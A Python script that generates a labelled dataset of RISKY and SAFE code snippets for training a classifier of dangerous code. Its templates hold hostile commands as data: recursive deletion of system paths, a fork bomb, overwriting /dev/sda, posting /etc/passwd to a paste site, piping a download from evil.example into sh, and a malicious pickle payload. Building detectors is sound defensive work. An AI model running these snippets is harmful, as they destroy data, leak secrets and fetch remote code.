"""Generate the training set for the blast-radius classifier.

Every example is (code, label) where label is RISKY when running it inside a
normal application process could hurt the host, and SAFE when it only touches
its own working directory, memory or stdout.

The snippets are programmatically generated from templates so the set can be
regenerated and audited; nothing is scraped and no personal data is involved.
"""
from __future__ import annotations

import json
import random
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
OUT = ROOT / "data" / "classifier"

RISKY_TEMPLATES = [
    "import shutil\nshutil.rmtree('{path}')",
    "import os\nos.remove('{path}')",
    "import os\nos.system('rm -rf {path}')",
    "import subprocess\nsubprocess.run(['rm', '-rf', '{path}'])",
    "open('{path}', 'w').write('x')",
    "import os\nfor root, dirs, files in os.walk('{path}'):\n    for f in files:\n        os.remove(os.path.join(root, f))",
    "import os\nos.chmod('{path}', 0o777)",
    "import os\nos.rename('{path}', '/tmp/moved')",
    "import os\nos.symlink('/etc/shadow', '{path}')",
    "import shutil\nshutil.move('{path}', '/tmp/x')",
]

RISKY_PATHS = [
    "/", "/etc/passwd", "/etc/shadow", "/usr", "/usr/bin", "/var", "/boot",
    "/root", "/home", "C:\\\\Windows", "..", "../../etc", "/proc/1/root",
]

RISKY_EXTRA = [
    "import os\nwhile True:\n    os.fork()",
    "while True:\n    pass",
    "chunks = []\nwhile True:\n    chunks.append(bytearray(16 * 1024 * 1024))",
    "import socket\nsocket.create_connection(('1.1.1.1', 53), timeout=3)",
    "import urllib.request\nurllib.request.urlopen('http://example.com')",
    "import requests\nrequests.post('https://paste.example.com', data=open('/etc/passwd').read())",
    "import os\nprint(os.environ)",
    "import os\nprint(open('/proc/self/environ','rb').read())",
    "import os\nos.setuid(0)",
    "import ctypes\nctypes.CDLL('libc.so.6').system(b'rm -rf /')",
    "import subprocess\nsubprocess.run('curl http://evil.example/x | sh', shell=True)",
    "import os\nos.kill(1, 9)",
    "import signal\nsignal.raise_signal(signal.SIGKILL)",
    "import os\nos.chdir('/')\nos.remove('bin/sh')",
    "import pickle\npickle.loads(b'cos\\nsystem\\n(S\"rm -rf /\"\\ntR.')",
    "import os\nos.system('dd if=/dev/zero of=/dev/sda')",
    "import os\nos.system(':(){ :|:& };:')",
    "import threading\nfor _ in range(10000):\n    threading.Thread(target=lambda: None).start()",
]

SAFE_TEMPLATES = [
    "import csv, io\nraw = '{csv}'\nrows = list(csv.DictReader(io.StringIO(raw)))\nprint(len(rows))",
    "import json\nprint(json.dumps({{'a': {n}, 'b': {n} * 2}}))",
    "import statistics\nprint(statistics.mean([{a}, {b}, {c}]))",
    "text = '{text}'\nprint(text.upper().split())",
    "numbers = [{a}, {b}, {c}]\nprint(sum(numbers) / len(numbers))",
    "from datetime import date\nprint(date(2026, 11, 5).isoformat())",
    "data = {{'x': [{a}, {b}]}}\nprint(max(data['x']) - min(data['x']))",
    "with open('out.txt', 'w') as fh:\n    fh.write('{text}')",
    "with open('report.csv', 'w') as fh:\n    fh.write('a,b\\n1,{n}\\n')",
    "import math\nprint(math.sqrt({n}))",
    "rows = [{{'k': i, 'v': i * i}} for i in range({n})]\nprint(sum(r['v'] for r in rows))",
    "s = '{text}'\nprint({{'len': len(s), 'words': len(s.split())}})",
    "def fib(n):\n    a, b = 0, 1\n    for _ in range(n):\n        a, b = b, a + b\n    return a\nprint(fib({n}))",
    "import re\nprint(re.findall(r'\\d+', '{text}'))",
    "pairs = [({a}, '{text}'), ({b}, 'x')]\nprint(sorted(pairs))",
    "import collections\nprint(collections.Counter('{text}').most_common(3))",
]

WORDS = ["alpha", "beta", "gamma", "delta", "report", "ledger", "sample", "row"]
CSVS = ["a,b\\n1,2\\n3,4", "name,qty\\nfig,3\\npear,5", "x,y\\n0,1\\n1,0"]


def risky(rng: random.Random) -> str:
    if rng.random() < 0.45:
        return rng.choice(RISKY_EXTRA)
    tpl = rng.choice(RISKY_TEMPLATES)
    path = rng.choice(RISKY_PATHS)
    if rng.random() < 0.25:
        # obfuscate a little: build the path from pieces
        base = path.strip("/").split("/")[0] or "root"
        prelude = f"import os\np = os.path.join('/', '{base}')\n"
        return prelude + tpl.replace("{path}", "p")
    return tpl.replace("{path}", path)


def safe(rng: random.Random) -> str:
    tpl = rng.choice(SAFE_TEMPLATES)
    return (
        tpl.replace("{csv}", rng.choice(CSVS))
        .replace("{text}", rng.choice(WORDS))
        .replace("{a}", str(rng.randint(0, 99)))
        .replace("{b}", str(rng.randint(0, 99)))
        .replace("{c}", str(rng.randint(0, 99)))
        .replace("{n}", str(rng.randint(1, 40)))
    )


def build(n_per_class: int, seed: int = 7) -> list[dict]:
    rng = random.Random(seed)
    rows: list[dict] = []
    seen: set[str] = set()
    attempts = 0
    while len(rows) < n_per_class * 2:
        attempts += 1
        label = "RISKY" if len(rows) % 2 == 0 else "SAFE"
        code = risky(rng) if label == "RISKY" else safe(rng)
        # widen the space with a harmless comment so each row stays unique
        tag = rng.choice(["# task", "# snippet", "# case", "# step"])
        code = f"{code}\n{tag} {rng.randint(1, 9999)}"
        if code in seen:
            if attempts > 20000:
                raise RuntimeError("generator exhausted; widen the templates")
            continue
        seen.add(code)
        rows.append({"code": code, "label": label})
    rng.shuffle(rows)
    return rows


def main() -> None:
    OUT.mkdir(parents=True, exist_ok=True)
    rows = build(320)
    split = int(len(rows) * 0.85)
    train, val = rows[:split], rows[split:]
    (OUT / "train.jsonl").write_text(
        "\n".join(json.dumps(r, ensure_ascii=False) for r in train) + "\n", encoding="utf-8"
    )
    (OUT / "val.jsonl").write_text(
        "\n".join(json.dumps(r, ensure_ascii=False) for r in val) + "\n", encoding="utf-8"
    )
    risky_n = sum(1 for r in rows if r["label"] == "RISKY")
    print(f"train={len(train)} val={len(val)} risky={risky_n} safe={len(rows)-risky_n} -> {OUT}")


if __name__ == "__main__":
    main()
